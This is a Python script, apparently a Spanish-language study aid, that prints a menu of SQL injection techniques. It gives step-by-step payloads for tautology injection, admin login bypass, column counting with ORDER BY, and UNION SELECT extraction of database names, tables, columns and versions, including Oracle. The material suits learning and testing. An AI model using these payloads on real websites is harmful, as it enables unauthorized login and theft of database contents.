
#Librerias
import funciones_generales

#Variables globales
numero_seleccion_final=""

def menu_interno(numero_seleccion):#Menu para la seleccion despues de cada ataque
    num_sel_int=int(numero_seleccion)
    print()
    print("--------------------------------------------------------------------")
    print("[1] Next:")
    print("[2] Ir al menu de la vulnerabilidad")
    print("[3] si desea ir al menu principal")
    print("--------------------------------------------------------------------")
    seleccion=input()
    if(seleccion=="1"):
        num_sel_int=num_sel_int+1
        numero_seleccion=str(num_sel_int)
        print()
        content_sql_injection(numero_seleccion)
    if(seleccion=="2"):
        sql_injection_menu()
        print()
    if(seleccion=="3"):
        funciones_generales.menu_principal()
        print()


def content_sql_injection(numero_seleccion):#Contenido de sql injection
    if(numero_seleccion=="1"):
        print("the hidden elements attack")
        print("HTTPS://link_de_la_page_web.net/ruta/ruta2?variable=valor[' or 1=1 -- -] ")
        print("--------------------------------------------------------------------------")
        print("Descriptcion: para ver las partes ocultas de una web.")
        print("Explicación:")
        print("[']: Es para cerrar la query y hacer un hueco para introducir el ataque malicioso.")
        print("[or]: Condición en la que nos va a servir para decir si esto si cumple O si esto otro cumple.")
        print("[1=1]: Se busca un TRUE por lo cual logicamente 1 es igual a 1.")
        print("[-- -]: para comentar la query faltante que quedo de la original. ")
        print()
    elif(numero_seleccion=="2"):
        print("the beginning of section without knowing data and attacking from the user.")
        print("Step #1: Irse al panel de autentincación.")
        print("Step #2: Nos ubicamos en el textbox donde copiamos el usuario.")
        print("Step #3 ATTACK: copiamos [{administrator/nom_usu}'--].")
        print("     Step +1:Si es necesario copiamos cualquier contraseña en el textbox de password.")
        print("--------------------------------------------------------------------------")
        print("[administrator/nom usu]: Se escribe administrador o cualquier nombre de usuario que se nos ocurra.")
        print("[']: Para hacer un hueco.")
        print("[--]: Para comentar las demás partes.")
        print()
    elif(numero_seleccion=="3"):
        print("Know columns")
        print("Descriptcion: La idea de este ataque es saber las columnas que tiene una tabla.")
        print("Step #1: Irse a la dirección HTTPS y generar un error para tener indicios que si se pueda hacer: HTTPS://link_de_la_page_web.net/ruta/ruta2?variable=valor['] ")
        print("Step #2: Se verifica a dónde nos sale el error.")
        print("Step #3: Encontrar una tabla para hacer el ataque")
        print("Step #4: Debemos identificar cuantas columnas debe de tener una tabla, la idea principal es buscar hasta que nos salga un error: HTTPS://link_de_la_page_web.net/ruta/ruta2?variable=valor['order by (Num) -- -]   ")
        print("Step #5: Conocer el rango de columnas.")
        print("Step #6: Ahora vamos a hacer con una instrucción de sql: HTTPS://link_de_la_page_web.net/ruta/ruta2?variable=valor['UNION SELECT null,null,null]")
        print("Step #7: En los campos de null podemos ejecutar funciones(Ósea en vez de poner null podemos poner la función):")
        print("     Attack #1: Ver versión de SQL: [null,null,version(),null,null]")
        print("     Attack #2: Ver el nombre de la DataBase: [null,null,database(),null,null]")
        print("     Attack #3: Ver cuál es el usuario que esta corriendo la DataBase: [null,null,user(),null,null]")
        print("--------------------------------------------------------------------------")
        print("[UNION]: Unir una consulta.")
        print()
    elif(numero_seleccion=="4"):
        print("find a column that is a string")
        print("Description: La idea con este ataque es ver que columnas puede contener un string")
        print("Step #1: Hacemos un UNION SELECT con Null: HTTPS://link_de_la_page_web.net/ruta/ruta2?variable=valor['UNION SELECT NULL,NULL,NULL]")
        print("Step #2: Probamos por cada columna el string para saber donde se puede hacer la sql inyection: HTTPS://link_de_la_page_web.net/ruta/ruta2?variable=valor['UNION SELECT NULL,'String',NULL]")
        print("--------------------------------------------------------------------------")
        print()
    elif(numero_seleccion=="5"):
        print("UNION attack recover data from another table")
        print("Step #1: Conocer el número de columnas: HTTPS://link_de_la_page_web.net/ruta/ruta2?variable=valor['UNION SELECT NULL,NULL,NULL -- -].")
        print("     Remember #1: Debemos incrementar o diminuir los NULL para saber cual es el rango.")
        print("Step #2: Ahora debemos saber cuál es la columna que es inyectable: ")
        print("Step #2: Probamos por cada columna el string para saber donde se puede hacer la sql inyection: HTTPS://link_de_la_page_web.net/ruta/ruta2?variable=valor['UNION SELECT NULL,'String',NULL]")
        print("     Remember #1: Debemos hacer la prueba por cada columna.")
        print("Step #3: Ahora vamos a ver las bases de datos  que hay: HTTPS://link_de_la_page_web.net/ruta/ruta2?variable=valor['UNION SELECT schema_name,NULL FROM information_schema.schemata-- -]")
        print("     Remember #1: El resultado lo tenremos que buscar en el contenido de la página (Habrán señales)")
        print("Step #4: Ahora vamos a conocer cuales son las tablas que tiene cada database: HTTPS://link_de_la_page_web.net/ruta/ruta2?variable=valor['UNION SELECT NULL,table_name FROM information_schema.tables where table_schema='Nom_de_la_tabla'-- -]")
        print("Step #5: Ahora vamos a conocer cuales son las columnas que tiene las tablas: HTTPS://link_de_la_page_web.net/ruta/ruta2?variable=valor['UNION SELECT NULL,column_name FROM information_schema.columns where table_schema='Database' and table_name='Nom_de_la_tabla'-- -]")
        print("Step #6: Vamos a ver los contenidos que tiene las columnas: HTTPS://link_de_la_page_web.net/ruta/ruta2?variable=valor['UNION SELECT Column_1,Column_2 FROM Nom_de_la_tabla-- -] ")
        print("     Step #6.1: Si queremos concatenar dos columnas para que se vea bien la información")
        print("         Step #6.1.1: Para Oracle y postgreSQL: 'column_A'||'Column_B'")
        print("         Step #6.1.2: Para Microsoft: 'column_A'+'Column_B'")
        print("         Step #6.1.3: Para mysql: 'column_A' 'Column_B' [Tenga en cuenta el espacio entre los dos strings] CONCAT('column_a','column_b')")
        print("--------------------------------------------------------------------------")
        print()
    elif(numero_seleccion=="6"):
        print("Know the version of the oracle")
        print("Step #Extra 1: Vamos a probar con la tabla DUAL cuantas columnas existen: HTTPS://link_de_la_page_web.net/ruta/ruta2?variable=valor['UNION SELECT NULL,NULL FROM dual-- -]")
        print("Step #1: Vamos a probar con la tabla DUAL cuantas columnas existen: HTTPS://link_de_la_page_web.net/ruta/ruta2?variable=valor['UNION SELECT NULL,banner FROM v$version-- -]")
        print("     Form #2: Vamos a probar con la tabla DUAL cuantas columnas existen: HTTPS://link_de_la_page_web.net/ruta/ruta2?variable=valor['UNION SELECT NULL,version FROM v$instance- -]")
        print()
    elif(numero_seleccion=="7"):
        print("get the version and database in mysql and microsoft")

    else:#Sino tenemos más ataques
        print("--------------------------------------------------------------------")
        print("Not more attacks")#Mostramos este mensaje
        print("--------------------------------------------------------------------")
        print()
        sql_injection_menu()#Volvemos al menu
        
    menu_interno(numero_seleccion)

def sql_injection_menu():#Menu interactivo del ataque de sql inyections
    print("         SQL inyection           ")
    print("             HITS                ")
    print("█████████████████████████████████")
    print("FIRST HIT #1: The hidden elements attack")
    print("SECOND HIT #2: The beginning of section without knowing data and attacking from the user")
    print("THIRD HIT #3: Know columns")
    print("FOURTH HIT #4: find a column that is a string")
    print("FIFTH HIT #5: UNION attack recover data from another table")
    print("SIXTH HIT #6: Know the version of the oracle")
    print("SEVENTH HIT #7: get the version and database in mysql and microsoft")
    print("█████████████████████████████████")
    numero_seleccion=input("select number of the attack: ")
    print()
    content_sql_injection(numero_seleccion)
